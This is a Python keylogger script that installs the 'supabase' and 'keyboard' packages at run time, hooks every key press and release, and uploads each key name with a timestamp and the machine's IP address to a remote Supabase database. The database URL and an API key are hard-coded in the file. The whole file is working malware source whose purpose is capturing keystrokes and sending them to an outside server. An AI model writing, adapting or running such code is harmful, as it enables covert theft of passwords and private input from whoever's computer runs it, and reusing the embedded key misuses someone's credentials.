import sys
import subprocess
import socket
from datetime import datetime, timezone

requiredModules = ["supabase", "keyboard"]
SUPABASE_URL = "https://jnczovwmdeqslohdqjom.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpuY3pvdndtZGVxc2xvaGRxam9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTI5OTE2MTAsImV4cCI6MjAyODU2NzYxMH0.jFKLurHSYY7t9dM6sKOkwD3VzlZ-UdPcwWzOj9OSjQQ"


def installModules():
    for module in requiredModules:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])


installModules()

from supabase import create_client, Client, PostgrestAPIError
import keyboard


class KeyLogger:
    def __init__(self) -> None:
        self.db: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
        print("DB Initialized")

        self.ip = socket.gethostbyname(socket.gethostname())
        print(f"IP: {self.ip}")

        try:
            query = self.db.table("IP_ADDRESS").insert({"ip": self.ip})
            query.execute()
        except PostgrestAPIError as e:
            if e.code != "23505":
                raise e

        keyboard.hook(lambda e: self.onKeyboardAction(e))
        keyboard.wait("")

    def onKeyboardAction(self, e: keyboard.KeyboardEvent) -> None:
        if e.event_type == keyboard.KEY_DOWN:
            self.onPress(e)
        elif e.event_type == keyboard.KEY_UP:
            self.onRelease(e)

    def onPress(self, event: keyboard._keyboard_event.KeyboardEvent) -> None:
        current_time = current_time = datetime.now(timezone.utc).strftime(
            "%Y-%m-%d %H:%M:%S.%f%z"
        )
        try:
            query = self.db.table("KEY_LOG").insert(
                {
                    "ip": self.ip,
                    "loggedAt": current_time,
                    "keyPressed": event.name,
                    "isKeyDown": True,
                }
            )
            query.execute()
        except Exception as e:
            print(e)

        print(f"IP:{self.ip} Time:{current_time} Key:{event.name}")

    def onRelease(self, event: keyboard._keyboard_event.KeyboardEvent) -> None:
        current_time = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f%z")
        try:
            query = self.db.table("KEY_LOG").insert(
                {
                    "ip": self.ip,
                    "loggedAt": current_time,
                    "keyPressed": event.name,
                    "isKeyDown": False,
                }
            )
            query.execute()
        except Exception as e:
            print(e)
        print(f"IP:{self.ip} Time:{current_time} ReleasedKey:{event.name}")


if __name__ == "__main__":
    # Driver Code
    kl = KeyLogger()
